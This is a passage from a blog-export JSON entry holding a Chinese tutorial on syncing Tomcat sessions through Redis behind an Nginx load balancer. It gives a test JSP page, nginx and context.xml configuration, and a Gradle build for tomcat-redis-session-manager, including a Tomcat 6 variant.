type=\"text/css\" href=\"styles.css\">\n    -->  \n  </head>  \n  <body>  \n        SessionID:<%=session.getId()%>  \n        <BR>  \n        SessionIP:<%=request.getServerName()%>  \n        <BR>  \n        SessionPort:<%=request.getServerPort()%>  \n        <%  \n        out.println(\"This is Tomcat Server 22222\");  \n        %>  \n  </body>  \n</html>\n```\n\n###### 2.nginx\n编辑/etc/nginx/nginx.conf 添加tomcat配置\n```\nuser www-data;\nworker_processes auto;\npid /run/nginx.pid;\n\nevents {\n\tworker_connections 768;\n\t# multi_accept on;\n}\n\nhttp {\n .......\n\tinclude /etc/nginx/conf.d/*.conf;\n\tinclude /etc/nginx/sites-enabled/*;\n\nupstream tomcat{\n\t#ip_hash;\n\tserver   192.168.93.132:8081\tweight=1;\n\tserver   192.168.93.133:8080\tweight=1;\n\t}\nserver{\n\tlisten 80;\n\tserver_name localhost 127.0.0.1;\n            location / {\n                root    html;\n                index   index.jsp;\n                proxy_pass      http://tomcat;\n                proxy_set_header        X-Real-IP       $remote_addr;\n                client_max_body_size    100m;\n            }\n\t}\n}\n........\n}\n```\n\n###### 3.redis\n这一步很坑，参照：https://my.oschina.net/Listening/blog/674759, 进行配置<br>\n\n将生成的jar包全部放入tomcat/lib/目录下<br>\n编辑tomcat/conf/content.xml文件,添加\n```\n<Context>\n    ........\n    <!--\n    <Valve className=\"org.apache.catalina.valves.CometConnectionManagerValve\" />\n    -->\n<Valve className=\"com.orangefunction.tomcat.redissessions.RedisSessionHandlerValve\" />\n<Manager className=\"com.orangefunction.tomcat.redissessions.RedisSessionManager\"\n    host=\"127.0.0.1\" //注意这里，应该是redis地址\n    port=\"6379\"\n    database=\"0\"\n    maxInactiveInterval=\"60\"\n/>\n\n</Context>\n```\n在这里可能会出现redis连接不上问题，原因是/etc/redis/redis.conf 文件里默认配置为 bind 127.0.0.1, 改为 0.0.0.0<br>\n除此之外也有可能防火墙原因.<br>\n重启 redis-server /etc/redis/redis.conf <br>\n查看是否监听0.0.0.0:6379端口 ps -ef | grep redis\n![redisport](../../images/redis.png)\n\n\n#### 4. 重启tomcat 查看效果\n![redisport](../../images/tomcat1.png)\n![redisport](../../images/tomcat2.png)\n\n可以看到现在session已经保持不变\n\n\n#### 5.2018-12-26补充\n公司项目是用的tomcat6部署，所以直接用上面打包好的jar包会报:java.lang.AbstractMethodError错误，意思是jar包冲突。<br>\n解决办法:<br>\n去github上下载tomcat6的分支，重新打包,将dist目录下所有jar包和bulid/lib目录下的tomcat-redis-session-XXXX.jar放到tomcat的lib目录下<br>\n```\napply plugin: 'java'\napply plugin: 'maven'\napply plugin: 'signing'\n\ngroup = 'com.orangefunction'\nversion = '1.2.0'\n\nrepositories {\n  mavenCentral()\n}\n\ncompileJava {\n  sourceCompatibility = 1.7\n  targetCompatibility = 1.7\n}\n\ndependencies {\n  //compile group: 'org.apache.tomcat', name: 'tomcat-catalina',\n   version: '6.0.37'\n  //用tomcat6.0.37的jar打包\n  compile fileTree(dir: 'pathto/your/tomcat6.0.37/lib', include: ['*.jar'])\n  compile group: 'redis.clients', name: 'jedis', version: '2.5.2'\n  compile group: 'org.apache.commons', name: 'commons-pool2', version: '2.2'\n\n  testCompile group: 'junit', name: 'junit', version: '4.+'\n  testCompile 'org.hamcrest:hamcrest-core:1.3'\n  testCompile 'org.hamcrest:hamcrest-library:1.3'\n  testCompile 'org.mockito:mockito-all:1.9.5'\n  testCompile group: 'org.apache.tomcat', name: 'tomcat-coyote', version: '6.0.37'\n}\n\ntask javadocJar(type: Jar, dependsOn: javadoc) {\n  classifier = 'javadoc'\n  from 'build/docs/javadoc'\n}\n\ntask sourcesJar(type: Jar) {\n  from sourceSets.main.allSource\n  classifier = 'sources'\n}\n\nartifacts {\n  archives jar\n\n  archives javadocJar\n  archives sourcesJar\n}\n\ntask copyJars(type: Copy) {\n  from configurations.runtime\n  into 'dist'  \n}\n\nuploadArchives {\n  repositories {\n    mavenDeployer {\n      beforeDeployment { MavenDeployment deployment -> signing.signPom(deployment) }\n\n\n      pom.project {\n        name 'tomcat-redis-session-manager'\n        packaging 'jar'\n        description 'Tomcat Redis Session Manager is a Tomcat extension to store sessions in Redis'\n        url 'https://github.com/jcoleman/tomcat-redis-session-manager'\n\n        issueManagement {\n          url 'https://github.com:jcoleman/tomcat-redis-session-manager/issues'\n          system 'GitHub Issues'\n        }\n\n        scm {\n          url 'https://github.com:jcoleman/tomcat-redis-session-manager'\n          connection 'scm:git:git://github.com/jcoleman/tomcat-redis-session-manager.git'\n          developerConnection 'scm:git:git@github.com:jcoleman/tomcat-redis-session-manager.git'\n        }\n\n        licenses {\n          license {\n            name 'MIT'\n            url 'http://opensource.org/licenses/MIT'\n            distribution 'repo'\n          }\n        }\n\n      }\n    }\n  }\n}\n```\ntomcat6版本在部署时，className名字和tomcat7版本不一样\n```\n<Valve className=\"com.radiadesign.catalina.session.RedisSessionHandlerValve\" />\n<Manager className=\"com.radiadesign.catalina.session.RedisSessionManager\"\n         host=\"localhost\" <!-- optional: defaults to \"localhost\" -->\n         port=\"6379\" <!-- optional: defaults to \"6379\" -->\n         database=\"0\" <!-- optional: defaults to \"0\" -->\n         maxInactiveInterval=\"60\" <!-- optional: defaults to \"60\" (in seconds) --> />\n```\n\n如果还报configure XXX.xml错误<br>\n到tomcat/conf/Catalina/localhost目录下，只保留你的项目.xml\n","source":"_posts/java/tomcat-redis-session.md","raw":"---\ntitle: tomcat-redis-session\ndate: 2018-09-28 15:47:53\ntags: [tomcat,java]\n---\n#### 1.需求\n不同Ip主机上的tomcat,保持session同步。<br>\n#### 2.查资料\n一般做法为，利用redis保持session,不同tomcat从redis存取，外层nginx做tomcat的负载均衡。<br>\n开源项目https://github.com/jcoleman/tomcat-redis-session-manager， 提供了tomcat连接redis的jar包，但是，我试了多次，总是不行，版本不对，或者class找不到等。<br>\n解决方案参照：https://my.oschina.net/Listening/blog/674759, 直接用gradle生成jar包。\n\n#### 3.实现\ntomcat7.0.61/nginx1.10.3/ubuntu虚拟机\n###### 1.tomcat\n- 解压两个tomcat到两个虚拟机\n- conf/server.xml更改端口，使之不重复\n- 添加index.jsp到 webapps/Root目录下\n- 分别启动tomcat,看看是否正常\n```\n<%@ page language=\"java\" import=\"java.util.*\" pageEncoding=\"UTF-8\"%>  \n<%  \nString path = request.getContextPath();  \nString basePath = request.getScheme()+\"://\"+request.getServerName()+\":\"+request.getServerPort()+path+\"/\";  \n%>  \n<!DOCTYPE HTML PUBLIC \"-//W3C//DTD HTML 4.01 Transitional//EN\">  \n<html>  \n  <head>  \n    <base href=\"<%=basePath%>\">  \n    <title>My JSP 'index.jsp' starting page</title>  \n    <meta http-equiv=\"pragma\" content=\"no-cache\">  \n    <meta http-equiv=\"cache-control\" content=\"no-cache\">  \n    <meta http-equiv=\"expires\" content=\"0\">      \n    <meta http-equiv=\"keywords\" content=\"keyword1,keyword2,keyword3\">  \n    <meta http-equiv=\"description\" content=\"This is my page\">  \n    <!--\n    <link rel=\"stylesheet\" type=\"text/css\" href=\"styles.css\">\n    -->  \n  </head>  \n  <body>  \n        SessionID:<%=session.getId()%>  \n        <BR>  \n        SessionIP:<%=request.getServerName()%>  \n        <BR>  \n        SessionPort:<%=request.getServerPort()%>  \n        <%  \n        out.println(\"This is Tomcat Server 22222\");  \n        %>  \n  </body>  \n</html>\n```\n\n###### 2.nginx\n编辑/etc/nginx/nginx.conf 添加tomcat配置\n```\nuser www-data;\nworker_processes auto;\npid /run/nginx.pid;\n\nevents {\n\tworker_connections 768;\n\t# multi_accept on;\n}\n\nhttp {\n .......\n\tinclude /etc/nginx/conf.d/*.conf;\n\tinclude /etc/nginx/sites-enabled/*;\n\nupstream tomcat{\n\t#ip_hash;\n\tserver   192.168.93.132:8081\tweight=1;\n\tserver   192.168.93.133:8080\tweight=1;\n\t}\nserver{\n\tlisten 80;\n\tserver_name localhost 127.0.0.1;\n            location / {\n                root    html;\n                index   index.jsp;\n                proxy_pass      http://tomcat;\n                proxy_set_header        X-Real-IP       $remote_addr;\n                client_max_body_size    100m;\n            }\n\t}\n}\n........\n}\n```\n\n###### 3.redis\n这一步很坑，参照：https://my.oschina.net/Listening/blog/674759, 进行配置<br>\n\n将生成的jar包全部放入tomcat/lib/目录下<br>\n编辑tomcat/conf/content.xml文件,添加\n```\n<Context>\n    ........\n    <!--\n    <Valve className=\"org.apache.catalina.valves.CometConnectionManagerValve\" />\n    -->\n<Valve className=\"com.orangefunction.tomcat.redissessions.RedisSessionHandlerValve\" />\n<Manager className=\"com.orangefunction.tomcat.redissessions.RedisSessionManager\"\n    host=\"127.0.0.1\" //注意这里，应该是redis地址\n    port=\"6379\"\n    database=\"0\"\n    maxInactiveInterval=\"60\"\n/>\n\n</Context>\n```\n在这里可能会出现redis连接不上问题，原因是/etc/redis/redis.conf 文件里默认配置为 bind 127.0.0.1, 改为 0.0.0.0<br>\n除此之外也有可能防火墙原因.<br>\n重启 redis-server /etc/redis/redis.conf <br>\n查看是否监听0.0.0.0:6379端口 ps -ef | grep redis\n![redisport](../../images/redis.png)\n\n\n#### 4. 重启tomcat 查看效果\n![redisport](../../images/tomcat1.png)\n![redisport](../../images/tomcat2.png)\n\n可以看到现在session已经保持不变\n\n\n#### 5.2018-12-26补充\n公司项目是用的tomcat6部署，所以直接用上面打包好的jar包会报:java.lang.AbstractMethodError错误，意思是jar包冲突。<br>\n解决办法:<br>\n去github上下载tomcat6的分支，重新打包,将dist目录下所有jar包和bulid/lib目录下的tomcat-redis-session-XXXX.jar放到tomcat的lib目录下<br>\n```\napply plugin: 'java'\napply plugin: 'maven'\napply plugin: 'signing'\n\ngroup = 'com.orangefunction'\nversion = '1.2.0'\n\nrepositories {\n  mavenCentral()\n}\n\ncompileJava {\n  sourceCompatibility = 1.7\n  targetCompatibility = 1.7\n}\n\ndependencies {\n  //compile group: 'org.apache.tomcat', name: 'tomcat-catalina',\n   version: '6.0.37'\n  //用tomcat6.0.37的jar打包\n  compile fileTree(dir: 'pathto/your/tomcat6.0.37/lib', include: ['*.jar'])\n  compile group: 'redis.clients', name: 'jedis', version: '2.5.2'\n  compile group: 'org.apache.commons', name: 'commons-pool2', version: '2.2'\n\n  testCompile group: 'junit', name: 'junit', version: '4.+'\n  testCompile 'org.hamcrest:hamcrest-core:1.3'\n  testCompile 'org.hamcrest:hamcrest-library:1.3'\n  testCompile 'org.mockito:mockito-all:1.9.5'\n  testCompile group: 'org.apache.tomcat', name: 'tomcat-coyote', version: '6.0.37'\n}\n\ntask javadocJar(type: Jar, dependsOn: javadoc) {\n  classifier = 'javadoc'\n  from 'build/docs/javadoc'\n}\n\ntask sourcesJar(type: Jar) {\n  from sourceSets.main.allSource\n  classifier = 'sources'\n}\n\nartifacts {\n  archives jar\n\n  archives javadocJar\n  archives sourcesJar\n}\n\ntask copyJars(type: Copy) {\n  from configurations.runtime\n  into 'dist'  \n}\n\nuploadArchives {\n  repositories {\n    mavenDeployer {\n      beforeDeployment { MavenDeployment deployment -> signing.signPom(deployment) }\n\n\n      pom.project {\n        name 'tomcat-redis-session-manager'\n        packaging 'jar'\n        description 'Tomcat Redis Session Manager is a Tomcat extension to store sessions in Redis'\n        url 'https://github.com/jcoleman/tomcat-redis-session-manager'\n\n        issueManagement {\n          url 'https://github.com:jcoleman/tomcat-redis-session-manager/issues'\n          system 'GitHub Issues'\n        }\n\n        scm {\n          url 'https://github.com:jcoleman/tomcat-redis-session-manager'\n          connection 'scm:git:git://github.com/jcoleman/tomcat-redis-session-manager.git'\n          developerConnection 'scm:git:git@github.com:jcoleman/tomcat-redis-session-manager.git'\n        }\n\n        licenses {\n          license {\n            name 'MIT'\n            url 'http://opensource.org/licenses/MIT'\n            distribution 'repo'\n          }\n        }\n\n      }\n    }\n  }\n}\n```\ntomcat6版本在部署时，className名字和tomcat7版本不一样\n```\n<Valve className=\"com.radiadesign.catalina.session.RedisSessionHandlerValve\" />\n<Manager className=\"com.radiadesign.catalina.session.RedisSessionManager\"\n         host=\"localhost\" <!-- optional: defaults to \"localhost\" -->\n         port=\"6379\" <!-- optional: defaults to \"6379\" -->\n         database=\"0\" <!-- optional: defaults to \"0\" -->\n         maxInactiveInterval=\"60\" <!-- optional: defaults to \"60\" (in seconds) --> />\n```\n\n如果还报configure XXX.xml错误<br>\n到tomcat/conf/Catalina/localhost目录下，只保留你的项目.xml\n","slug":"java/tomcat-redis-session","published":1,"updated":"2019-01-21T09:08:04.885Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cjr640521001a6cvpkang5ng4","content":"<h4 id=\"1-需求\"><a href=\"#1-需求\" class=\"headerlink\" title=\"1.需求\"></a>1.需求</h4><p>不同Ip主机上的tomcat,保持session同步。<br></p>\n<h4 id=\"2-查资料\"><a href=\"#2-查资料\" class=\"headerlink\" title=\"2.查资料\"></a>2.查资料</h4><p>一般做法为，利用redis保持session,不同tomcat从redis存取，外层nginx做tomcat的负载均衡。<br><br>开源项目<a href=\"https://github.com/jcoleman/tomcat-redis-session-manager，\" target=\"_blank\" rel=\"noopener\">https://github.com/jcoleman/tomcat-redis-session-manager，</a> 提供了tomcat连接redis的jar包，但是，我试了多次，总是不行，版本不对，或者class找不到等。<br><br>解决方案参照：<a href=\"https://my.oschina.net/Listening/blog/674759\" target=\"_blank\" rel=\"noopener\">https://my.oschina.net/Listening/blog/674759</a>, 直接用gradle生成jar包。</p>\n<h4 id=\"3-实现\"><a href=\"#3-实现\" class=\"headerlink\" title=\"3.实现\"></a>3.实现</h4><p>tomcat7.0.61/nginx1.10.3/ubuntu虚拟机</p>\n<h6 id=\"1-tomcat\"><a href=\"#1-tomcat\" class=\"headerlink\" title=\"1.tomcat\"></a>1.tomcat</h6><ul>\n<li>解压两个tomcat到两个虚拟机</li>\n<li>conf/server.xml更改端口，使之不重复</li>\n<li>添加index.jsp到 webapps/Root目录下</li>\n<li>分别启动tomcat,看看是否正常<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;%@ page language=&quot;java&quot; import=&quot;java.util.*&quot; pageEncoding=&quot;UTF-8&quot;%&gt;  </span><br><span class=\"line\">&lt;%  </span><br><span class=\"line\">String path = request.getContextPath();  </span><br><span class=\"line\">String basePath = request.getScheme()+&quot;://&quot;+request.getServerName()+&quot;:&quot;+request.getServerPort()+path+&quot;/&quot;;  </span><br><span class=\"line\">%&gt;  </span><br><span class=\"line\">&lt;!DOCTYPE HTML PUBLIC &quot;-//W3C//DTD HTML 4.01 Transitional//EN&quot;&gt;  </span><br><span class=\"line\">&lt;html&gt;  </span><br><span class=\"line\">  &lt;head&gt;  </span><br><span class=\"line\">    &lt;base href=&quot;&lt;%=basePath%&gt;&quot;&gt;  </span><br><span class=\"line\">    &lt;title&gt;My JSP &apos;index.jsp&apos; starting page&lt;/title&gt;  </span><br><span class=\"line\">    &lt;meta http-equiv=&quot;pragma&quot; content=&quot;no-cache&quot;&gt;  </span><br><span class=\"line\">    &lt;meta http-equiv=&quot;cache-control&quot; content=&quot;no-cache&quot;&gt;  </span><br><span class=\"line\">    &lt;meta http-equiv=&quot;expires&quot; content=&quot;0&quot;&gt;      </span><br><span class=\"line\">    &lt;meta http-equiv=&quot;keywords&quot; content=&quot;keyword1,keyword2,keyword3&quot;&gt;  </span><br><span class=\"line\">    &lt;meta http-equiv=&quot;description&quot; content=&quot;This is my page&quot;&gt;  </span><br><span class=\"line\">    &lt;!--</span><br><span class=\"line\">    &lt;link rel=&quot;stylesheet&quot; type=&quot;text/css&quot; href=&quot;styles.css&quot;&gt;</span><br><span class=\"line\">    --&gt;  </span><br><span class=\"line\">  &lt;/head&gt;  </span><br><span class=\"line\">  &lt;body&gt;  </span><br><span class=\"line\">        SessionID:&lt;%=session.getId()%&gt;  </span><br><span class=\"line\">        &lt;BR&gt;  </span><br><span class=\"line\">        SessionIP:&lt;%=request.getServerName()%&gt;  </span><br><span class=\"line\">        &lt;BR&gt;  </span><br><span class=\"line\">        SessionPort:&lt;%=request.getServerPort()%&gt;  </span><br><span class=\"line\">        &lt;%  </span><br><span class=\"line\">        out.println(&quot;This is Tomcat Server 22222&quot;);  </span><br><span class=\"line\">        %&gt;  </span><br><span class=\"line\">  &lt;/body&gt;  </span><br><span class=\"line\">&lt;/html&gt;</span><br></pre></td></tr></table></figure>\n</li>\n</ul>\n<h6 id=\"2-nginx\"><a href=\"#2-nginx\" class=\"headerlink\" title=\"2.nginx\"></a>2.nginx</h6><p>编辑/etc/nginx/nginx.conf 添加tomcat配置<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">user www-data;</span><br><span class=\"line\">worker_processes auto;</span><br><span class=\"line\">pid /run/nginx.pid;</span><br><span class=\"line\"></span><br><span class=\"line\">events &#123;</span><br><span class=\"line\">\tworker_connections 768;</span><br><span class=\"line\">\t# multi_accept on;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">http &#123;</span><br><span class=\"line\"> .......</span><br><span class=\"line\">\tinclude /etc/nginx/conf.d/*.conf;</span><br><span class=\"line\">\tinclude /etc/nginx/sites-enabled/*;</span><br><span class=\"line\"></span><br><span class=\"line\">upstream tomcat&#123;</span><br><span class=\"line\">\t#ip_hash;</span><br><span class=\"line\">\tserver   192.168.93.132:8081\tweight=1;</span><br><span class=\"line\">\tserver   192.168.93.133:8080\tweight=1;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">server&#123;</span><br><span class=\"line\">\tlisten 80;</span><br><span class=\"line\">\tserver_name localhost 127.0.0.1;</span><br><span class=\"line\">            location / &#123;</span><br><span class=\"line\">                root    html;</span><br><span class=\"line\">                index   index.jsp;</span><br><span class=\"line\">                proxy_pass      http://tomcat;</span><br><span class=\"line\">                proxy_set_header        X-Real-IP       $remote_addr;</span><br><span class=\"line\">                client_max_body_size    100m;</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">........</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure></p>\n<h6 id=\"3-redis\"><a href=\"#3-redis\" class=\"headerlink\" title=\"3.redis\"></a>3.redis</h6><p>这一步很坑，参照：<a href=\"https://my.oschina.net/Listening/blog/674759\" target=\"_blank\" rel=\"noopener\">https://my.oschina.net/Listening/blog/674759</a>, 进行配置<br></p>\n<p>将生成的jar包全部放入tomcat/lib/目录下<br><br>编辑tomcat/conf/content.xml文件,添加<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;Context&gt;</span><br><span class=\"line\">    ........</span><br><span class=\"line\">    &lt;!--</span><br><span class=\"line\">    &lt;Valve className=&quot;org.apache.catalina.valves.CometConnectionManagerValve&quot; /&gt;</span><br><span class=\"line\">    --&gt;</span><br><span class=\"line\">&lt;Valve className=&quot;com.orangefunction.tomcat.redissessions.RedisSessionHandlerValve&quot; /&gt;</span><br><span class=\"line\">&lt;Manager className=&quot;com.orangefunction.tomcat.redissessions.RedisSessionManager&quot;</span><br><span class=\"line\">    host=&quot;127.0.0.1&quot; //注意这里，应该是redis地址</span><br><span class=\"line\">    port=&quot;6379&quot;</span><br><span class=\"line\">    database=&quot;0&quot;</span><br><span class=\"line\">    maxInactiveInterval=&quot;60&quot;</span><br><span class=\"line\">/&gt;</span><br><span class=\"line\"></span><br><span class=\"line\">&lt;/Context&gt;</span><br></pre></td></tr></table></figure></p>\n<p>在这里可能会出现redis连接不上问题，原因是/etc/redis/redis.conf 文件里默认配置为 bind 127.0.0.1, 改为 0.0.0.0<br><br>除此之外也有可能防火墙原因.<br><br>重启 redis-server /etc/redis/redis.conf <br><br>查看是否监听0.0.0.0:6379端口 ps -ef | grep redis<br><img src=\"../../images/redis.png\" alt=\"redisport\"></p>\n<h4 id=\"4-重启tomcat-查看效果\"><a href=\"#4-重启tomcat-查看效果\" class=\"headerlink\" title=\"4. 重启tomcat 查看效果\"></a>4. 重启tomcat 查看效果</h4><p><img src=\"../../images/tomcat1.png\" alt=\"redisport\"><br><img src=\"../../images/tomcat2.png\" alt=\"redisport\"></p>\n<p>可以看到现在session已经保持不变</p>\n<h4 id=\"5-2018-12-26补充\"><a href=\"#5-2018-12-26补充\" class=\"headerlink\" title=\"5.2018-12-26补充\"></a>5.2018-12-26补充</h4><p>公司项目是用的tomcat6部署，所以直接用上面打包好的jar包会报:java.lang.AbstractMethodError错误，意思是jar包冲突。<br><br>解决办法:<br><br>去github上下载tomcat6的分支，重新打包,将dist目录下所有jar包和bulid/lib目录下的tomcat-redis-session-XXXX.jar放到tomcat的lib目录下<br><br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br><span class=\"line\">83</span><br><span class=\"line\">84</span><br><span class=\"line\">85</span><br><span class=\"line\">86</span><br><span class=\"line\">87</span><br><span class=\"line\">88</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">apply plugin: &apos;java&apos;</span><br><span class=\"line\">apply plugin: &apos;maven&apos;</span><br><span class=\"line\">apply plugin: &apos;signing&apos;</span><br><span class=\"line\"></span><br><span class=\"line\">group = &apos;com.orangefunction&apos;</span><br><span class=\"line\">version = &apos;1.2.0&apos;</span><br><span class=\"line\"></span><br><span class=\"line\">repositories &#123;</span><br><span class=\"line\">  mavenCentral()</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">compileJava &#123;</span><br><span class=\"line\">  sourceCompatibility = 1.7</span><br><span class=\"line\">  targetCompatibility = 1.7</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">dependencies &#123;</span><br><span class=\"line\">  //compile group: &apos;org.apache.tomcat&apos;, name: &apos;tomcat-catalina&apos;,</span><br><span class=\"line\">   version: &apos;6.0.37&apos;</span><br><span class=\"line\">  //用tomcat6.0.37的jar打包</span><br><span class=\"line\">  compile fileTree(dir: &apos;pathto/your/tomcat6.0.37/lib&apos;, include: [&apos;*.jar&apos;])</span><br><span class=\"line\">  compile group: &apos;redis.clients&apos;, name: &apos;jedis&apos;, version: &apos;2.5.2&apos;</span><br><span class=\"line\">  compile group: &apos;org.apache.commons&apos;, name: &apos;commons-pool2&apos;, version: &apos;2.2&apos;</span><br><span class=\"line\"></span><br><span class=\"line\">  testCompile group: &apos;junit&apos;, name: &apos;junit&apos;, version: &apos;4.+&apos;</span><br><span class=\"line\">  testCompile &apos;org.hamcrest:hamcrest-core:1.3&apos;</span><br><span class=\"line\">  testCompile &apos;org.hamcrest:hamcrest-library:1.3&apos;</span><br><span class=\"line\">  testCompile &apos;org.mockito:mockito-all:1.9.5&apos;</span><br><span class=\"line\">  testCompile group: &apos;org.apache.tomcat&apos;, name: &apos;tomcat-coyote&apos;, version: &apos;6.0.37&apos;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">task javadocJar(type: Jar, dependsOn: javadoc) &#123;</span><br><span class=\"line\">  classifier = &apos;javadoc&apos;</span><br><span class=\"line\">  from &apos;build/docs/javadoc&apos;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">task sourcesJar(type: Jar) &#123;</span><br><span class=\"line\">  from sourceSets.main.allSource</span><br><span class=\"line\">  classifier = &apos;sources&apos;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">artifacts &#123;</span><br><span class=\"line\">  archives jar</span><br><span class=\"line\"></span><br><span class=\"line\">  archives javadocJar</span><br><span class=\"line\">  archives sourcesJar</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">task copyJars(type: Copy) &#123;</span><br><span class=\"line\">  from configurations.runtime</span><br><span class=\"line\">  into &apos;dist&apos;  </span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">uploadArchives &#123;</span><br><span class=\"line\">  repositories &#123;</span><br><span class=\"line\">    mavenDeployer &#123;</span><br><span class=\"line\">      beforeDeployment &#123; MavenDeployment deployment -&gt; signing.signPom(deployment) &#125;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">      pom.project &#123;</span><br><span class=\"line\">        name &apos;tomcat-redis-session-manager&apos;</span><br><span class=\"line\">        packaging &apos;jar&apos;</span><br><span class=\"line\">        description &apos;Tomcat Redis Session Manager is a Tomcat extension to store sessions in Redis&apos;</span><br><span class=\"line\">        url &apos;https://github.com/jcoleman/tomcat-redis-session-manager&apos;</span><br><span class=\"line\"></span><br><span class=\"line\">        issueManagement &#123;</span><br><span class=\"line\">          url &apos;https://github.com:jcoleman/tomcat-redis-session-manager/issues&apos;</span><br><span class=\"line\">          system &apos;GitHub Issues&apos;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">        scm &#123;</span><br><span class=\"line\">          url &apos;https://github.com:jcoleman/tomcat-redis-session-manager&apos;</span><br><span class=\"line\">          connection &apos;scm:git:git://github.com/jcoleman/tomcat-redis-session-manager.git&apos;</span><br><span class=\"line\">          developerConnection &apos;scm:git:git@github.com:jcoleman/tomcat-redis-session-manager.git&apos;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">        licenses &#123;</span><br><span class=\"line\">          license &#123;</span><br><span 